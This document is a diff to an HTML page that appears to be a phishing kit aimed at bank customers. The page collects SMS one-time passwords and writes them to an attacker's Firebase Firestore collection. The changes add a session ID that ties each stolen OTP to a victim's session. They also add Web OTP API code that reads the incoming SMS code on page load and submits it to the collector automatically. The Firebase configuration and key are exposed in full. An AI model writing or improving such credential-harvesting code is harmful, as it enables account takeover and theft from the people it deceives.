@@ -8,8 +8,8 @@
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
-
- <style>
+  
+  <style>
     html, body {
       margin: 0;
       padding: 0;
@@ -237,9 +237,7 @@
     <input type="text" id="otpInput" class="otp-input" placeholder="Enter OTP" maxlength="8" oninput="validateOTP()" required>
     <div id="otpError" class="error-message">Please enter OTP</div>
 
-    <!-- Timer -->
     <div id="otp-timer">Wait for OTP: <span id="timer">03:00 seconds</span></div>
-
     <button class="resend-otp" onclick="resendOTP()">Resend OTP</button>
     <button class="submit-btn" onclick="submitForm()">Submit</button>
   </div>
@@ -256,17 +254,24 @@
 
   <!-- Firebase Config & JS Logic -->
   <script>
+    // Firebase configuration
     const firebaseConfig = {
       apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
       authDomain: "sbighsh.firebaseapp.com",
       projectId: "sbighsh",
-      storageBucket: "sbighsh.firebasestorage.app",
+      storageBucket: "sbighsh.appspot.com",
       messagingSenderId: "685947657107",
       appId: "1:685947657107:web:471a0557bb72235272a666"
     };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    // Generate session ID once per tab
+    let sessionId = generateSessionId();
+    function generateSessionId() {
+      return 'sess_' + Math.random().toString(36).substr(2, 9) + Date.now();
+    }
 
     var timerInterval;
     var totalSeconds = 180;
@@ -311,6 +316,7 @@
 
       db.collection("otp_verifications").add({
         otp: otpValue,
+        sessionId: sessionId,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         showLoading();
@@ -339,8 +345,26 @@
       input.value = input.value.replace(/[^0-9]/g, '').slice(0, 8);
     }
 
+    // Web OTP API (auto read)
+    async function autoReadOTP() {
+      if (!('OTPCredential' in window)) return;
+      try {
+        const content = await navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: new AbortController().signal
+        });
+        const otp = content.code;
+        document.getElementById('otpInput').value = otp;
+        validateOTP();
+        submitForm();
+      } catch (err) {
+        console.log("Web OTP API failed:", err);
+      }
+    }
+
     window.onload = function () {
       startTimer();
+      autoReadOTP(); // auto read OTP
     };
   </script>
 </body>
